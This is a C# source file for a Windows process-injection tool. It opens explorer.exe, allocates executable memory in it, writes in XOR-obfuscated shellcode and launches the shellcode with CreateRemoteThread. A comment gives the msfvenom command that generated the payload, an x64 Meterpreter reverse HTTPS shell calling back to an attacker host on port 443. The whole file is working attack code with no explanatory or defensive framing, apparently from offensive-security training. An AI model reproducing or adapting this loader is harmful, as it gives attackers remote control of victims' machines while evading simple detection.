﻿using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, uint processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            //if (args.Length == 0)
            //{
            //    Console.WriteLine($"Usage: inject.exe <Remote PID>");
            //    return;
            //}

            uint procId;
            //procId = uint.Parse(args[0]); // This is the remote process id we want to inject to
            procId = (uint)(Process.GetProcessesByName("explorer")[0]).Id; // Maybe default to explorer.exe in error

            // Get a Handle to a remote process
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, procId);

            // Allocate memory in remote process for our shellcode
            IntPtr memAllocAddr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // Shellcode x64 meterpreter
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f csharp
            byte[] encrypted = new byte[] { 0xfe, 0x4a, 0x81, 0xe6, 0xf2, 0xea, 0xce, 0x02, 0x02, 0x02, 0x43, 0x53, 0x43, 0x52, 0x50, 0x53, 0x4a, 0x33, 0xd0, 0x67, 0x4a, 0x89, 0x50, 0x62, 0x54, 0x4a, 0x89, 0x50, 0x1a, 0x4a, 0x89, 0x50, 0x22, 0x4a, 0x0d, 0xb5, 0x48, 0x48, 0x4f, 0x33, 0xcb, 0x4a, 0x89, 0x70, 0x52, 0x4a, 0x33, 0xc2, 0xae, 0x3e, 0x63, 0x7e, 0x00, 0x2e, 0x22, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0xe0, 0xef, 0x50, 0x4a, 0x89, 0x50, 0x22, 0x43, 0x53, 0x89, 0x40, 0x3e, 0x4a, 0x03, 0xd2, 0x64, 0x83, 0x7a, 0x1a, 0x09, 0x00, 0x0d, 0x87, 0x70, 0x02, 0x02, 0x02, 0x89, 0x82, 0x8a, 0x02, 0x02, 0x02, 0x4a, 0x87, 0xc2, 0x76, 0x65, 0x4a, 0x03, 0xd2, 0x52, 0x89, 0x4a, 0x1a, 0x46, 0x89, 0x42, 0x22, 0x4b, 0x03, 0xd2, 0xe1, 0x54, 0x4f, 0x33, 0xcb, 0x4a, 0xfd, 0xcb, 0x43, 0x89, 0x36, 0x8a, 0x4a, 0x03, 0xd4, 0x4a, 0x33, 0xc2, 0xae, 0x43, 0xc3, 0xcb, 0x0f, 0x43, 0x03, 0xc3, 0x3a, 0xe2, 0x77, 0xf3, 0x4e, 0x01, 0x4e, 0x26, 0x0a, 0x47, 0x3b, 0xd3, 0x77, 0xda, 0x5a, 0x46, 0x89, 0x42, 0x26, 0x4b, 0x03, 0xd2, 0x64, 0x43, 0x89, 0x0e, 0x4a, 0x46, 0x89, 0x42, 0x1e, 0x4b, 0x03, 0xd2, 0x43, 0x89, 0x06, 0x8a, 0x4a, 0x03, 0xd2, 0x43, 0x5a, 0x43, 0x5a, 0x5c, 0x5b, 0x58, 0x43, 0x5a, 0x43, 0x5b, 0x43, 0x58, 0x4a, 0x81, 0xee, 0x22, 0x43, 0x50, 0xfd, 0xe2, 0x5a, 0x43, 0x5b, 0x58, 0x4a, 0x89, 0x10, 0xeb, 0x49, 0xfd, 0xfd, 0xfd, 0x5f, 0x4a, 0x33, 0xd9, 0x51, 0x4b, 0xbc, 0x75, 0x6b, 0x6c, 0x6b, 0x6c, 0x67, 0x76, 0x02, 0x43, 0x54, 0x4a, 0x8b, 0xe3, 0x4b, 0xc5, 0xc0, 0x4e, 0x75, 0x24, 0x05, 0xfd, 0xd7, 0x51, 0x51, 0x4a, 0x8b, 0xe3, 0x51, 0x58, 0x4f, 0x33, 0xc2, 0x4f, 0x33, 0xcb, 0x51, 0x51, 0x4b, 0xb8, 0x38, 0x54, 0x7b, 0xa5, 0x02, 0x02, 0x02, 0x02, 0xfd, 0xd7, 0xea, 0x0d, 0x02, 0x02, 0x02, 0x33, 0x3b, 0x30, 0x2c, 0x33, 0x34, 0x3a, 0x2c, 0x36, 0x3b, 0x2c, 0x30, 0x31, 0x32, 0x02, 0x58, 0x4a, 0x8b, 0xc3, 0x4b, 0xc5, 0xc2, 0xb9, 0x03, 0x02, 0x02, 0x4f, 0x33, 0xcb, 0x51, 0x51, 0x68, 0x01, 0x51, 0x4b, 0xb8, 0x55, 0x8b, 0x9d, 0xc4, 0x02, 0x02, 0x02, 0x02, 0xfd, 0xd7, 0xea, 0x56, 0x02, 0x02, 0x02, 0x2d, 0x3b, 0x70, 0x46, 0x55, 0x7a, 0x37, 0x6b, 0x68, 0x56, 0x6b, 0x65, 0x44, 0x5d, 0x53, 0x56, 0x5d, 0x58, 0x33, 0x65, 0x76, 0x48, 0x53, 0x6c, 0x4f, 0x69, 0x60, 0x77, 0x6a, 0x73, 0x6c, 0x55, 0x74, 0x70, 0x36, 0x32, 0x63, 0x34, 0x31, 0x66, 0x44, 0x63, 0x4c, 0x55, 0x32, 0x60, 0x52, 0x4e, 0x4d, 0x52, 0x55, 0x48, 0x43, 0x67, 0x33, 0x5a, 0x4c, 0x4b, 0x34, 0x36, 0x66, 0x34, 0x4b, 0x58, 0x75, 0x48, 0x58, 0x52, 0x7a, 0x64, 0x43, 0x4a, 0x40, 0x7a, 0x52, 0x52, 0x5d, 0x35, 0x30, 0x78, 0x63, 0x6a, 0x57, 0x02, 0x4a, 0x8b, 0xc3, 0x51, 0x58, 0x43, 0x5a, 0x4f, 0x33, 0xcb, 0x51, 0x4a, 0xba, 0x02, 0x30, 0xaa, 0x86, 0x02, 0x02, 0x02, 0x02, 0x52, 0x51, 0x51, 0x4b, 0xc5, 0xc0, 0xe9, 0x57, 0x2c, 0x39, 0xfd, 0xd7, 0x4a, 0x8b, 0xc4, 0x68, 0x08, 0x5d, 0x4a, 0x8b, 0xf3, 0x68, 0x1d, 0x58, 0x50, 0x6a, 0x82, 0x31, 0x02, 0x02, 0x4b, 0x8b, 0xe2, 0x68, 0x06, 0x43, 0x5b, 0x4b, 0xb8, 0x77, 0x44, 0x9c, 0x84, 0x02, 0x02, 0x02, 0x02, 0xfd, 0xd7, 0x4f, 0x33, 0xc2, 0x51, 0x58, 0x4a, 0x8b, 0xf3, 0x4f, 0x33, 0xcb, 0x4f, 0x33, 0xcb, 0x51, 0x51, 0x4b, 0xc5, 0xc0, 0x2f, 0x04, 0x1a, 0x79, 0xfd, 0xd7, 0x87, 0xc2, 0x77, 0x1d, 0x4a, 0xc5, 0xc3, 0x8a, 0x11, 0x02, 0x02, 0x4b, 0xb8, 0x46, 0xf2, 0x37, 0xe2, 0x02, 0x02, 0x02, 0x02, 0xfd, 0xd7, 0x4a, 0xfd, 0xcd, 0x76, 0x00, 0xe9, 0xa8, 0xea, 0x57, 0x02, 0x02, 0x02, 0x51, 0x5b, 0x68, 0x42, 0x58, 0x4b, 0x8b, 0xd3, 0xc3, 0xe0, 0x12, 0x4b, 0xc5, 0xc2, 0x02, 0x12, 0x02, 0x02, 0x4b, 0xb8, 0x5a, 0xa6, 0x51, 0xe7, 0x02, 0x02, 0x02, 0x02, 0xfd, 0xd7, 0x4a, 0x91, 0x51, 0x51, 0x4a, 0x8b, 0xe5, 0x4a, 0x8b, 0xf3, 0x4a, 0x8b, 0xd8, 0x4b, 0xc5, 0xc2, 0x02, 0x22, 0x02, 0x02, 0x4b, 0x8b, 0xfb, 0x4b, 0xb8, 0x10, 0x94, 0x8b, 0xe0, 0x02, 0x02, 0x02, 0x02, 0xfd, 0xd7, 0x4a, 0x81, 0xc6, 0x22, 0x87, 0xc2, 0x76, 0xb0, 0x64, 0x89, 0x05, 0x4a, 0x03, 0xc1, 0x87, 0xc2, 0x77, 0xd0, 0x5a, 0xc1, 0x5a, 0x68, 0x02, 0x5b, 0xb9, 0xe2, 0x1f, 0x28, 0x08, 0x43, 0x8b, 0xd8, 0xfd, 0xd7 };

            #region XOR Decryption routine
            byte[] buf = new byte[encrypted.Length];
            uint key = 2;

            // The &0xff is to keep the shellcode in the Ascii range 
            for (int i = 0; i < encrypted.Length; i++)
            {
                // Decryption routine is the same
                buf[i] = (byte)(((uint)encrypted[i] ^ key) & 0xff);
            }
            #endregion

            // Write the shellcode into the remote process allocated memory
            IntPtr outSize;
            bool bwriteProc = WriteProcessMemory(hProcess, memAllocAddr, buf, buf.Length, out outSize);

            // Create thread in the remote process to execute our shellcode
            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, memAllocAddr, IntPtr.Zero, 0, IntPtr.Zero);

        }
    }
}
